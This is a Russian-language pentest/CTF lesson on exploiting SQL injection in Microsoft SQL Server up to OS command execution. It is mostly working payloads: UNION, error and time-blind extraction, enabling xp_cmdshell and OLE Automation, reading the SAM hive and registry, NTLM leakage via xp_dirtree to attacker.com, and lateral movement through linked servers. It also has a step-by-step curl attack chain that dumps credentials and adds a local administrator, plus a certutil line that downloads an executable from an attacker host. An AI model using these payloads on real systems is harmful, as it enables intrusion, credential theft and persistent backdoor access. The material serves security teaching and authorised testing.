---
id: db-mssql
title: "MSSQL: инъекции на практике — xp_cmdshell и linked servers"
category: web
parent: web-sqli-dbms-enterprise
difficulty: hard
order: 1
tags: [sqli, mssql, sqlserver, xp_cmdshell, openrowset, impacket, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест внутренних сетей"
estimated_minutes: 45
summary: "MSSQL от фингерпринта до RCE: sys.objects, WAITFOR, xp_cmdshell, OPENROWSET, linked servers и impacket mssqlclient."
---

Microsoft SQL Server — «рабочая лошадка» корпоративных Windows-приложений (ASP.NET, SharePoint, ERP). Для пентеста это подарок: `xp_cmdshell` даёт выполнение команд ОС «из коробки», `xp_dirtree` — NTLM-утечки и SSRF, а linked servers позволяют латеральное движение. Инъекция в MSSQL почти всегда означает путь к системной оболочке, если у пользователя есть права `sysadmin`.

## Фингерпринт и версия

Признаки MSSQL: `Unclosed quotation mark after the character string`, `Incorrect syntax near`, `Microsoft OLE DB Provider for SQL Server`, `[SQL Server]`. Комментарий — `--` и `/* */`. Часто встречается в параметрах `id=` с числовыми значениями и в ASP.NET (`?id=1`).

```sql
SELECT @@version;                                        -- Microsoft SQL Server 2019 ...
SELECT @@servername;                                     -- SQLPROD01
SELECT db_name();                                        -- appdb
SELECT system_user;                                      -- sa / DOMAIN\svc_sql
SELECT user_name();                                      -- dbo
SELECT is_srvrolemember('sysadmin');                     -- 1 = да
SELECT @@spid;                                           -- id сессии
SELECT SERVERPROPERTY('ProductVersion');                 -- 15.0.2000.5
SELECT SERVERPROPERTY('IsIntegratedSecurityOnly');       -- режим аутентификации
```

## Схема и данные: sys.objects и information_schema

```sql
-- базы
SELECT name FROM master..sysdatabases;
-- таблицы текущей базы
SELECT name FROM sys.objects WHERE type='U';
SELECT table_name FROM information_schema.tables;
-- колонки
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users');
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users';
-- пользователи БД
SELECT name FROM sys.database_principals WHERE type IN ('S','U','G');
-- серверные логины
SELECT name, is_disabled FROM sys.server_principals;
-- права
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
```

Агрегация строк — `STRING_AGG` (2017+) или `FOR XML PATH` (старые версии):

```sql
SELECT STRING_AGG(name, ',') FROM sys.objects WHERE type='U';
-- до 2017:
SELECT STUFF((SELECT ',' + name FROM sys.objects WHERE type='U' FOR XML PATH('')), 1, 1, '');
```

`STUFF(...,1,1,'')` убирает ведущую запятую. Конкатенация — `+` или `CONCAT`.

## Error-based (CONVERT) и blind (WAITFOR)

**Error-based через `CONVERT`/`CAST`** — приводим данные к `int`:

```sql
SELECT CONVERT(int, @@version);
-- Conversion failed when converting the varchar value 'Microsoft SQL Server ...' to data type int.
SELECT CONVERT(int, (SELECT TOP 1 name FROM sys.objects WHERE type='U'));
-- Conversion failed ... value 'users' ...
```

Для больших строк режем `SUBSTRING` и объединяем результат из ошибок.

**Boolean-blind:**

```sql
1 AND 1=1
1 AND (SELECT SUBSTRING(db_name(),1,1))='a'
1 AND (SELECT COUNT(*) FROM sys.objects WHERE type='U')>3
1 AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.objects WHERE type='U'),1,1))>100
```

**Time-blind — `WAITFOR DELAY`:**

```sql
1; WAITFOR DELAY '0:0:5'-- -
1 AND (SELECT 1 WHERE 1=1) = 1; WAITFOR DELAY '0:0:5'-- -
1; IF (1=1) WAITFOR DELAY '0:0:5'-- -
1; IF (ASCII(SUBSTRING(db_name(),1,1))>100) WAITFOR DELAY '0:0:5'-- -
```

`WAITFOR TIME` вместо `DELAY` — ждёт до конкретного времени.

## xp_cmdshell: включение и использование

`xp_cmdshell` — расширенная процедура для запуска команд ОС. По умолчанию отключена; включается при правах `sysadmin`.

```sql
-- проверка статуса
SELECT value FROM sys.configurations WHERE name='xp_cmdshell';   -- 0 = off
-- включить (нужен sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- выполнить команду
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
EXEC xp_cmdshell 'powershell -e <base64>';
EXEC xp_cmdshell 'certutil -urlcache -f http://attacker/p.exe C:\Windows\Temp\p.exe';
```

`xp_cmdshell` возвращает вывод команды как строки — идеально для интерактивной работы через инъекцию:

```bash
curl -s "https://target/item?id=1;EXEC xp_cmdshell 'whoami'-- -"
# nt authority\system
```

Если `xp_cmdshell` выключен и включить нельзя — есть `sp_OACreate` (OLE Automation) для запуска процессов без него.

## Файлы, реестр, OPENROWSET и OLE Automation

**`xp_dirtree` / `xp_fileexist`** — листинг файлов и проверка существования (также вызывают SMB-запрос → NTLM-утечка, ловится Responder'ом):

```sql
EXEC master..xp_dirtree 'C:\', 1, 1;
EXEC master..xp_dirtree '\\attacker.com\share';     -- NTLM к attacker
EXEC master..xp_fileexist 'C:\Windows\win.ini';
EXEC master..xp_subdirs 'C:\';
```

**`OPENROWSET(BULK ...)`** — чтение файлов (нужен `AD HOC Distributed Queries`):

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE;

SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
-- читаем бинарник в hex
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS x;
```

**OLE Automation (`sp_OACreate`)** — RCE без `xp_cmdshell`:

```sql
EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;
DECLARE @o INT;
EXEC sp_OACreate 'WScript.Shell', @o OUT;
EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\o.txt';
```

**Реестр** — чтение через `xp_regread`:

```sql
EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Lsa','LimitBlankPasswordUse';
EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SAM\SAM\Domains\Account\Users\000001F4','F';
```

## Linked servers и латеральное движение

Linked servers позволяют выполнять запросы на других MSSQL-серверах от имени их логинов.

```sql
-- список linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
-- запрос через linked server
SELECT * FROM OPENQUERY([SQL02], 'SELECT name FROM master..sysdatabases');
-- включить xp_cmdshell на удалённом сервере
EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE;') AT [SQL02];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL02];
-- через OPENROWSET
SELECT * FROM OPENROWSET('SQLNCLI', 'Server=SQL02;Trusted_Connection=yes;', 'SELECT @@version');
```

Цепочка linked servers (`sp_addlinkedserver`) — классический путь к Domain Controller.

## impacket mssqlclient и sqlmap

**impacket mssqlclient** — интерактивный клиент с командами `enable_xp_cmdshell`, `xp_cmdshell`, `shell`:

```bash
# Windows-аутентификация (домен)
python3 mssqlclient.py 'DOMAIN/user:password@10.0.0.20' -windows-auth
# SQL-логин
python3 mssqlclient.py 'sa:Passw0rd@10.0.0.20'
# внутри:
#   SQL> enable_xp_cmdshell
#   SQL> xp_cmdshell whoami
#   SQL> shell
```

**sqlmap** по MSSQL:

```bash
sqlmap -u 'https://target/item?id=1' --batch --dbms=mssql --dbs
sqlmap -r request.txt -p id --batch --dbms=mssql --os-shell
sqlmap -r request.txt -p id --batch --os-cmd='whoami'
sqlmap -r request.txt -p id --batch --file-read='C:\Windows\win.ini'
sqlmap -r request.txt -p id --batch --tamper=space2comment,between
```

## Разобранный пример: от кавычки до SYSTEM

Цель: `https://portal.local/Default.aspx?id=1` (ASP.NET + MSSQL).

```bash
# Шаг 1. Ошибка MSSQL
curl -s "https://portal.local/Default.aspx?id=1'" | grep -iE "unclosed|SQL Server|syntax"
# Unclosed quotation mark after the character string ''.

# Шаг 2. Число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://portal.local/Default.aspx?id=1 ORDER BY $n-- -" | wc -c; done
# 1 5100 / 2 5100 / 3 5100 / 4 480 -> 3

# Шаг 3. Версия + права
curl -s "https://portal.local/Default.aspx?id=-1 UNION SELECT 1,@@version,3-- -"
curl -s "https://portal.local/Default.aspx?id=-1 UNION SELECT 1,CAST(is_srvrolemember('sysadmin') AS varchar),3-- -"
# 1 -> sysadmin

# Шаг 4. Схема
curl -s "https://portal.local/Default.aspx?id=-1 UNION SELECT 1,STRING_AGG(name,','),3 FROM sys.objects WHERE type='U'-- -"
# users,orders,logs

# Шаг 5. Креды
curl -s "https://portal.local/Default.aspx?id=-1 UNION SELECT 1,STRING_AGG(username+':'+password,','),3 FROM users-- -"

# Шаг 6. Включаем xp_cmdshell
curl -s "https://portal.local/Default.aspx?id=1;EXEC sp_configure 'show advanced options',1;RECONFIGURE;-- -"
curl -s "https://portal.local/Default.aspx?id=1;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -"

# Шаг 7. Выполняем команду
curl -s "https://portal.local/Default.aspx?id=1;EXEC xp_cmdshell 'whoami'-- -"
# nt authority\system

# Шаг 8. Реверс-шелл (или добавляем админа)
curl -s "https://portal.local/Default.aspx?id=1;EXEC xp_cmdshell 'net user pwn P@ss123 /add'-- -"
curl -s "https://portal.local/Default.aspx?id=1;EXEC xp_cmdshell 'net localgroup administrators pwn /add'-- -"
```

## Частые ошибки

- **Считать, что `xp_cmdshell` «просто есть».** Он отключён по умолчанию и требует `sysadmin`.
- **Забывать про `RECONFIGURE`.** После `sp_configure` обязательно `RECONFIGURE` (иначе значение не применяется).
- **Путать `+` и `||`.** В MSSQL конкатенация строк — `+` (или `CONCAT`), `||` не работает.
- **Игнорировать типы в UNION.** Нужны явные `CAST(... AS varchar)`/`CONVERT(varchar, ...)`, иначе ошибка конвертации.
- **Не проверять `is_srvrolemember('sysadmin')`.** От этого зависит, доступен ли RCE и linked servers.
- **Терять вывод `xp_cmdshell`.** Многострочный вывод возвращается как несколько строк; в UNION-дампе используйте `STRING_AGG`.
- **Трогать прод без нужды.** `net user /add`, включение `xp_cmdshell` и запуск OLE — заметные изменения; согласуйте.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы: фингерпринт, клиентские команды, извлечение по техникам, файлы/реестр/RCE и привилегии. Конкатенация строк в MSSQL — `+` (не двойная вертикальная черта), а в UNION нужны явные `CAST(... AS varchar)`.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `@@version` | полная версия + ОС | `SELECT @@version;` → `Microsoft SQL Server 2019 ... Windows` |
| `SERVERPROPERTY('ProductVersion')` | номер версии | → `15.0.2000.5` |
| `SERVERPROPERTY('Edition')` | редакция | `Enterprise Edition` |
| `SERVERPROPERTY('IsIntegratedSecurityOnly')` | только Windows-auth? | `1`/`0` |
| `SERVERPROPERTY('MachineName')` | имя машины | `SQLPROD01` |
| `@@servername` | имя инстанса | `SQLPROD01` |
| `db_name()` | текущая база | `appdb` |
| `system_user` | логин на уровне сервера | `sa` / `DOMAIN\svc_sql` |
| `user_name()` | пользователь БД | `dbo` |
| `CURRENT_USER` | текущий пользователь | `dbo` |
| `SUSER_SNAME()` | серверный логин | |
| `ORIGINAL_LOGIN()` | исходный логин (до impersonation) | |
| `@@spid` | id сессии | |
| `HOST_NAME()` | имя клиента | |
| `is_srvrolemember('sysadmin')` | я sysadmin? | `1`/`0` |
| `CONNECTIONPROPERTY('client_net_address')` | IP клиента | |

Признак по ошибкам: `Unclosed quotation mark after the character string`, `Incorrect syntax near`, `Microsoft OLE DB Provider for SQL Server`, `[SQL Server]`. Комментарий — `--` и `/* */`.

### (б) Клиентский CLI (sqlcmd / impacket mssqlclient)

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `sqlcmd -S host,1433 -U sa -P pass` | SQL-аутентификация | `sqlcmd -S 10.0.0.20 -U sa -P 'P@ss'` |
| `sqlcmd -S host -E` | Windows-аутентификация (trusted) | `sqlcmd -S sql01 -E` |
| `-d db` | выбрать базу | `sqlcmd -S host -U sa -P p -d appdb` |
| `-Q 'SQL'` | выполнить и выйти | `sqlcmd -S host -U sa -P p -Q "SELECT @@version"` |
| `-i file.sql` | выполнить файл | `sqlcmd -S host -U sa -P p -i q.sql` |
| `-o out.txt` | вывод в файл | `sqlcmd ... -o result.txt` |
| `-C` | доверять сертификату | `sqlcmd -C -S host -U sa -P p` |
| `-N` | шифровать соединение | `sqlcmd -N -S host ...` |
| `-l sec` | таймаут логина | `sqlcmd -l 5 ...` |
| `-h -1` | без заголовков | `sqlcmd -h -1 -W ...` |
| `-W` | убрать хвостовые пробелы | `sqlcmd -W ...` |
| `-s ','` | разделитель колонок | `sqlcmd -s ',' ...` |
| `mssqlclient.py 'DOM/user:pass@host' -windows-auth` | интерактивный клиент (impacket) | |
| `mssqlclient.py 'sa:pass@host'` | SQL-логин | |
| `enable_xp_cmdshell` (в mssqlclient) | включить xp_cmdshell | |
| `xp_cmdshell whoami` (в mssqlclient) | выполнить команду | |
| `shell` (в mssqlclient) | ОС-оболочка | |

### (в) Извлечение данных по техникам

| Техника | Пейлоад | Пример |
|---------|---------|--------|
| UNION (число колонок) | `ORDER BY n` | `?id=1 ORDER BY 4-- -` |
| UNION (вывод) | `-1 UNION SELECT 1,@@version,3` | `?id=-1 UNION SELECT 1,CAST(@@version AS varchar),3-- -` |
| UNION (схема) | `STRING_AGG(name,',')` | `...SELECT 1,STRING_AGG(name,','),3 FROM sys.objects WHERE type='U'-- -` |
| UNION (данные) | `STRING_AGG(user+':'+pass,',')` | `...SELECT 1,STRING_AGG(username+':'+password,','),3 FROM users-- -` |
| Error-based | `CONVERT(int, X)` | `SELECT CONVERT(int,@@version)` → `Conversion failed when converting the varchar value '...' to data type int.` |
| Error-based | `CAST(X AS int)` | `SELECT CAST((SELECT TOP 1 name FROM sys.objects) AS int)` |
| Boolean-blind | `AND 1=1` / `AND 1=2` | `?id=1 AND 1=2-- -` |
| Boolean-blind | `SUBSTRING`/`ASCII` | `?id=1 AND ASCII(SUBSTRING(db_name(),1,1))>100-- -` |
| Time-blind | `WAITFOR DELAY '0:0:5'` | `?id=1; WAITFOR DELAY '0:0:5'-- -` |
| Time-blind | `IF (cond) WAITFOR DELAY` | `?id=1; IF (ASCII(SUBSTRING(db_name(),1,1))>100) WAITFOR DELAY '0:0:5'-- -` |
| Time-blind | `WAITFOR TIME` | `?id=1; WAITFOR TIME '23:59:59'-- -` |
| OOB (SMB/NTLM) | `xp_dirtree '\\attacker\share'` | `?id=1; EXEC master..xp_dirtree '\\attacker.com\share'-- -` |
| OOB (HTTP) | `OPENROWSET` к attacker | `SELECT * FROM OPENROWSET('SQLNCLI','Server=attacker;...','SELECT 1')` |
| Stacked | `;` (поддерживается) | `?id=1; EXEC xp_cmdshell 'whoami'-- -` |

### (г) Чтение/запись файлов, реестр и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `xp_cmdshell 'cmd'` | выполняет команду ОС (нужен sysadmin) | `EXEC xp_cmdshell 'whoami';` |
| `sp_configure 'xp_cmdshell',1` | включает xp_cmdshell | `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` |
| `sp_OACreate 'WScript.Shell'` | RCE без xp_cmdshell (OLE Automation) | `EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami > C:\t.txt';` |
| `OPENROWSET(BULK 'path', SINGLE_CLOB)` | читает текстовый файл | `SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini',SINGLE_CLOB) AS x;` |
| `OPENROWSET(BULK 'path', SINGLE_BLOB)` | читает бинарник | `...BULK 'C:\Windows\System32\config\SAM',SINGLE_BLOB...` |
| `xp_dirtree 'path'` | листинг каталога + SMB-запрос | `EXEC master..xp_dirtree 'C:\',1,1;` |
| `xp_fileexist 'path'` | существует ли файл | `EXEC master..xp_fileexist 'C:\Windows\win.ini';` |
| `xp_subdirs 'path'` | подкаталоги | `EXEC master..xp_subdirs 'C:\';` |
| `xp_regread 'HKLM',...` | читает реестр | `EXEC xp_regread 'HKEY_LOCAL_MACHINE','SAM\SAM\Domains\Account\Users\000001F4','F';` |
| `xp_regwrite` | пишет реестр | `EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','...','val','REG_SZ','data';` |
| `bcp` | массовый импорт/экспорт файлов | `EXEC xp_cmdshell 'bcp "SELECT * FROM users" queryout C:\u.txt -c -T';` |
| `xp_availablemedia` | доступные диски | `EXEC master..xp_availablemedia;` |
| `xp_enumdsn` | ODBC DSN | `EXEC master..xp_enumdsn;` |
| `sp_makewebtask` | пишет HTML-файл (старые версии) | `EXEC sp_makewebtask 'C:\inetpub\wwwroot\x.asp','SELECT ...';` |

### (д) Привилегии и эскалация

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `SELECT IS_SRVROLEMEMBER('sysadmin')` | я sysadmin? | `1`/`0` |
| `SELECT * FROM fn_my_permissions(NULL,'SERVER')` | мои серверные права | |
| `SELECT name,is_disabled FROM sys.server_principals` | логины сервера | |
| `SELECT * FROM sys.server_role_members` | членство в ролях | |
| `SELECT name,password_hash FROM sys.sql_logins` | хэши SQL-логинов (нужны права) | `SELECT name,password_hash FROM sys.sql_logins WHERE is_disabled=0` |
| `EXEC sp_addsrvrolemember 'user','sysadmin'` | добавить в sysadmin | |
| `EXEC sp_helprolemember 'sysadmin'` | члены роли | |
| `EXECUTE AS LOGIN = 'sa'` | импersonation логина | `EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER; REVERT;` |
| `EXECUTE AS USER = 'dbo'` | импersonation пользователя БД | |
| `SELECT * FROM sys.database_principals` | пользователи БД | `SELECT name,type_desc FROM sys.database_principals` |
| `EXEC sp_linkedservers` | linked servers | `EXEC sp_linkedservers; SELECT * FROM sys.servers;` |
| `EXEC (...) AT [SQL02]` | запрос через linked server | `EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL02];` |
| `OPENROWSET('SQLNCLI',...)` | ad-hoc соединение | `SELECT * FROM OPENROWSET('SQLNCLI','Server=SQL02;Trusted_Connection=yes;','SELECT @@version')` |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какая процедура MSSQL выполняет команды операционной системы?"
  options:
    - "xp_cmdshell"
    - "pg_read_file"
    - "COPY FROM PROGRAM"
    - "dbms_java"
  answer: 0
  explanation: "xp_cmdshell запускает команды; отключена по умолчанию."
- question: "Что нужно выполнить после sp_configure, чтобы применить настройку?"
  options:
    - "COMMIT"
    - "RECONFIGURE"
    - "RESTART"
    - "FLUSH"
  answer: 1
  explanation: "sp_configure меняет значение, RECONFIGURE применяет его."
- question: "Какая конструкция делает паузу для time-based blind в MSSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY '0:0:5'"
    - "BENCHMARK(...)"
  answer: 2
  explanation: "WAITFOR DELAY — задержка MSSQL."
- question: "Что позволяет xp_dirtree, помимо листинга каталогов?"
  options:
    - "Читать пароли напрямую"
    - "Инициировать SMB-запрос для перехвата NTLM-хэша"
    - "Отключать WAF"
    - "Создавать linked servers"
  answer: 1
  explanation: "Указав UNC-путь, вы заставляете сервер аутентифицироваться на вашем хосте (Responder)."
- question: "Как латерально переместиться на другой MSSQL-сервер?"
  options:
    - "Через linked servers (EXEC ... AT [SQL02])"
    - "Через load_extension"
    - "Через ATTACH DATABASE"
    - "Через UTL_HTTP"
  answer: 0
  explanation: "Linked servers и OPENQUERY/OPENROWSET выполняют запросы на удалённом сервере."
```

## Где пригодится

- **CTF (Web):** MSSQL-задачи почти всегда закрываются `xp_cmdshell` → чтение флага.
- **Bug bounty:** инъекция в MSSQL с `sysadmin` — максимальный приоритет; RCE = critical.
- **Пентест внутренних сетей:** linked servers и NTLM-утечки через `xp_dirtree` — стандартный путь к DC.
- **Работа (AppSec/Blue):** понимание, почему `xp_cmdshell`, OLE Automation и `Ad Hoc Distributed Queries` должны быть выключены.
